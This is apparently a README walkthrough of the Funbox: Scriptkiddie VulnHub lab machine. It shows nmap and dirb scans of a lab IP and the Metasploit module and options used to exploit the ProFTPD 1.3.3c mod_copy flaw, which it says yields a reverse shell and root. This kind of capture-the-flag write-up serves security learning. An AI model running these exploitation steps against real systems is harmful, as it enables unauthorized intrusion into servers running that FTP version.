# Funbox: Scriptkiddie - VulnHub Walkthrough

![VulnHub](https://www.vulnhub.com/static/img/logo.png)

## 🔗 Download Link

You can download the vulnerable VM from VulnHub:  
👉 [Funbox: Scriptkiddie - VulnHub](https://www.vulnhub.com/entry/funbox-scriptkiddie,725/)

---

## 🧠 Description

This repository contains a complete walkthrough of the **Funbox: Scriptkiddie** vulnerable machine. The goal is to gain root access by identifying and exploiting known vulnerabilities.

---

## 🛠️ Tools Used

- Nmap
- Firefox / Web Browser
- Dirb
- Metasploit Framework

---

## 🕵️‍♂️ Walkthrough

### 1. Nmap Scan

nmap -sV 10.0.2.9
Identified open ports:

21/tcp - FTP (ProFTPD 1.3.3c)

80/tcp - HTTP

2. HTTP Enumeration
Accessing the webpage:


http://10.0.2.9
No useful information found.

Tried brute-forcing directories:


dirb http://10.0.2.9
No significant results.

3. FTP Enumeration
Nmap revealed the FTP version is:

r

ProFTPD 1.3.3c
This version has a known vulnerability involving the mod_copy module.

4. Exploitation via Metasploit
Search for the exploit:


search ProFTPD 1.3.3c
Use the identified module:


use exploit/unix/ftp/proftpd_modcopy_exec
Set options:


set RHOST 10.0.2.9
set RPORT 21
run
5. Shell Access
Successfully gained a reverse shell and escalated privileges to root.

✅ Outcome
Gained full root access to the target machine.

Learned about exploiting FTP via ProFTPD mod_copy.

📁 Notes
Always confirm service versions before attempting known exploits.

Enumeration is key—never skip steps.

Use Metasploit responsibly and only on authorized systems.
